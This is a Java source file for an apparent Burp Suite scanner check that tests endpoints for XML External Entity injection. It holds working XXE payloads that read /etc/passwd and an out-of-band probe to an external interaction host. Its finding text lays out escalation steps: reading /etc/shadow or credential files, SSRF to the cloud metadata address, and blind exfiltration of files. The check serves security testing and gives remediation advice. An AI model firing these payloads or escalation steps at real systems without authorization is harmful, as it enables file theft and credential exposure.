package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.ScanContext;
import com.rx0.burp.scanner.VulnCheck;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * XML External Entity Injection: sends an XML body with a DOCTYPE declaring
 * an external entity pointing at /etc/passwd, to endpoints that accept XML.
 * If the file's content comes back in the response, the server's XML parser
 * is processing external entities with no restriction.
 *
 * Created by Rx0 - @rodrigocoutinho91
 */
public class XxeCheck implements VulnCheck {

    private static final String[] PATHS = {"/api/xml", "/api/upload", "/api/import", "/xmlrpc.php", "/api/data", "/"};

    private static final String XXE_PAYLOAD =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE rx0 [ <!ENTITY rx0xxe SYSTEM \"file:///etc/passwd\"> ]>\n" +
            "<root><data>&rx0xxe;</data></root>";

    private static final Pattern PASSWD_SIGNATURE = Pattern.compile("root:.*:0:0:", Pattern.CASE_INSENSITIVE);
    private static final Pattern XXE_ERROR_SIGNATURE = Pattern.compile(
            "DOCTYPE is disallowed|external entit(y|ies)|SAXParseException|XMLStreamException", Pattern.CASE_INSENSITIVE);

    @Override
    public String name() {
        return "XXE — XML External Entity Injection";
    }

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl) {
        return execute(api, baseUrl, (ScanContext) null);
    }

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl, ScanContext ctx) {
        List<Finding> findings = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        // --- OOB confirmation via interactsh: an external entity pointing at our host (XXE-via-SSRF) ---
        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isAvailable()) {
            for (String path : PATHS) {
                try {
                    String host = ctx.interactsh().createProbe(
                            "XXE confirmed via out-of-band interaction at " + path,
                            Severity.CRITICAL,
                            base + path,
                            "The endpoint's XML parser processed an external entity pointing at a unique test domain, " +
                                    "and the request was actually received — an unambiguous confirmation of XXE, even when the " +
                                    "content read is not directly reflected in the response (blind XXE).",
                            "Disable DOCTYPE/external entities in the XML parser, or use a parser that doesn't support external DTDs by default.",
                            "1) Reproduce the XML payload pointing the entity at the test domain. 2) Since this confirmed blind XXE, " +
                                    "use this same channel to exfiltrate files: declare an XML parameter entity that reads the " +
                                    "local file and appends it as part of the requested external URL (XXE OOB data exfiltration).");
                    if (host != null) {
                        String oobPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                                "<!DOCTYPE rx0 [ <!ENTITY rx0oob SYSTEM \"http://" + host + "/rx0-xxe-oob-probe\"> ]>\n" +
                                "<root><data>&rx0oob;</data></root>";
                        HttpRequest oobReq = HttpRequest.httpRequestFromUrl(base + path)
                                .withMethod("POST")
                                .withAddedHeader("Content-Type", "application/xml")
                                .withBody(oobPayload);
                        api.http().sendRequest(oobReq);
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Error firing XXE OOB probe (" + path + "): " + e.getMessage());
                }
            }
        }

        for (String path : PATHS) {
            try {
                String url = base + path;
                HttpRequest req = HttpRequest.httpRequestFromUrl(url)
                        .withMethod("POST")
                        .withAddedHeader("Content-Type", "application/xml")
                        .withBody(XXE_PAYLOAD);
                HttpResponse resp = api.http().sendRequest(req).response();
                if (resp == null) continue;

                String body = resp.bodyToString();
                if (body == null) continue;

                if (PASSWD_SIGNATURE.matcher(body).find()) {
                    findings.add(new Finding(
                            "XXE confirmed at " + path,
                            Severity.CRITICAL,
                            url,
                            "The server processed the external entity declared in the XML and returned the content of " +
                                    "/etc/passwd in the response — a confirmed XML External Entity Injection, which can allow " +
                                    "arbitrary file reads and, in some cases, SSRF or denial of service.",
                            "Payload sent via Content-Type: application/xml | Content of /etc/passwd found in the response.",
                            "Disable DOCTYPE/external entities in the XML parser (e.g. setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true) " +
                                    "in Java), or use a parser that doesn't support external DTDs by default.",
                            "1) In Repeater, resend the POST to " + url + " with Content-Type application/xml and the DOCTYPE payload. " +
                                    "2) Change the entity's target to read other files (e.g. file:///etc/shadow, or on Windows C:\\Windows\\win.ini, " +
                                    "or an application config file with credentials). 3) To test SSRF via XXE, swap the entity for an " +
                                    "internal URL (e.g. SYSTEM \"http://169.254.169.254/latest/meta-data/\"). 4) For blind XXE (no direct return), " +
                                    "use Out-of-Band XXE via Burp Collaborator as the external channel."));
                } else if (XXE_ERROR_SIGNATURE.matcher(body).find()) {
                    findings.add(new Finding(
                            "Endpoint processes XML with a DOCTYPE (XXE not confirmed, needs review)",
                            Severity.MEDIUM,
                            url,
                            "The server returned an error related to DOCTYPE/external entity processing — the parser " +
                                    "tried to process the entity but something blocked it (it may already be mitigated, or it may need another " +
                                    "vector/payload to confirm). Worth a manual investigation.",
                            "Status: " + resp.statusCode() + " | Error message related to DOCTYPE/entity found.",
                            "Manually confirm whether the parser actually blocks external entities on every code path."));
                }
            } catch (Exception e) {
                api.logging().logToError("[Rx0] Error in XXE check (" + path + "): " + e.getMessage());
            }
        }
        return findings;
    }
}
